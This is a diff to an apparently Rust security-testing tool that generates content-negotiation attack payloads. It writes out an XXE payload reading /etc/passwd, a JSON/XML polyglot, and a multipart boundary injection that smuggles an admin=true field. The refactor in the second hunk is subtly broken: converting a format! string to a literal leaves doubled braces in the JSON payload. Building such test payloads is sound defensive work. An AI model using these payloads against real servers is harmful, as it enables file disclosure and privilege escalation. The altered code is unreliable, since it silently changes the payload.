@@ -369,9 +369,7 @@ pub fn generate_serialization_confusion_payloads(
         source_format: SerializationFormat::Json,
         target_format: SerializationFormat::Xml,
         content_type_sent: "application/xml".to_string(),
-        payload: format!(
-            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>"
-        ),
+        payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>".to_string(),
         attack_vector: SerializationAttackVector::XxeInjection,
         severity: ContentNegotiationSeverity::Critical,
         description: "Send XML body with XXE payload where JSON is expected to test if server falls back to XML parsing".to_string(),
@@ -391,9 +389,7 @@ pub fn generate_serialization_confusion_payloads(
         source_format: SerializationFormat::Json,
         target_format: SerializationFormat::Xml,
         content_type_sent: "application/json".to_string(),
-        payload: format!(
-            "{{\"data\": \"<?xml version='1.0'?><test/>\"}}",
-        ),
+        payload: "{{\"data\": \"<?xml version='1.0'?><test/>\"}}".to_string(),
         attack_vector: SerializationAttackVector::PolyglotPayload,
         severity: ContentNegotiationSeverity::High,
         description: "Embed XML inside JSON string value to test if secondary parsing occurs on field contents".to_string(),
@@ -499,9 +495,7 @@ pub fn generate_boundary_manipulations(original_boundary: &str) -> Vec<Multipart
             "multipart/form-data; boundary={}; boundary=injected",
             original_boundary
         ),
-        payload_snippet: format!(
-            "--injected\r\nContent-Disposition: form-data; name=\"admin\"\r\n\r\ntrue\r\n--injected--"
-        ),
+        payload_snippet: "--injected\r\nContent-Disposition: form-data; name=\"admin\"\r\n\r\ntrue\r\n--injected--".to_string(),
         severity: ContentNegotiationSeverity::High,
         description: "Inject second boundary parameter to smuggle additional form fields past validation".to_string(),
     });
